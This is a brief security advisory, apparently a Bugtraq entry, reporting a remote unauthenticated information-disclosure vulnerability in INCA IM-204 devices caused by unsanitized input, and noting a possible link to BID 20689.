INCA IM-204 devices are prone to a remote information-disclosure vulnerability because the devices fail to properly sanitize user-supplied input.

Exploiting this issue allows remote, unauthenticated attackers to gain access to potentially sensitive configuration information from affected devices. This may aid them in further attacks.

This BID may be related to BID 20689; the issues are very similar in nature.
